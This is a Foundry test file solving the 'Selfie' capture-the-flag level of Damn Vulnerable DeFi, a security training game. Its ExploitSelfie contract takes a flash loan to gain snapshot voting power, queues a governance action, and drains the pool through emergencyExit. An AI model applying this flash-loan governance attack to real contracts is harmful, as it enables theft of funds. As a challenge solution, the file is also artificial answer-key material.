// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../../src/DamnValuableTokenSnapshot.sol";
import "openzeppelin/interfaces/IERC3156FlashBorrower.sol";

interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
}

interface IDamnValuableToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function snapshot() external returns (uint256);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface ISimpleGovernance {
    function queueAction(
        address target,
        uint128 value,
        bytes calldata data
    ) external returns (uint256 actionId);

    function executeAction(uint256 actionId)
        external
        payable
        returns (bytes memory);
}

contract ExploitSelfie is IERC3156FlashBorrower {
    uint256 POOL_BALANCE = 1_500_000e18;
    address pool;
    address dvt;
    address governance;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _pool,
        address _token,
        address _governance
    ) {
        pool = _pool;
        dvt = _token;
        governance = _governance;
    }

    function flashLoan(bytes calldata data) external {
        IDamnValuableToken(dvt).approve(pool, POOL_BALANCE);
        ISelfiePool(pool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            dvt,
            POOL_BALANCE,
            data
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        IDamnValuableToken(dvt).snapshot();
        ISimpleGovernance(governance).queueAction(address(pool), 0, data);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract SelfieTest is Test {
    uint256 POOL_BALANCE = 1_500_000e18;
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot dvt;
    ExploitSelfie exploitSelfie;

    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        console.log(attacker);

        dvt = new DamnValuableTokenSnapshot(POOL_BALANCE);
        governance = new SimpleGovernance(address(dvt));
        pool = new SelfiePool(address(dvt), address(governance));

        dvt.transfer(address(pool), POOL_BALANCE); // 1.5 million tokens
        assertEq(dvt.balanceOf(address(pool)), POOL_BALANCE);

        exploitSelfie = new ExploitSelfie(
            address(pool),
            address(dvt),
            address(governance)
        );
    }

    function testSefieRewarder() public {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(attacker),
            POOL_BALANCE
        );

        exploitSelfie.flashLoan(data);
        vm.warp(3 days);
        vm.startPrank(attacker);
        governance.executeAction(1);
        validation();
    }

    function validation() public {
        assertEq(dvt.balanceOf(attacker), POOL_BALANCE);
        assertEq(dvt.balanceOf(address(pool)), 0);
    }
}
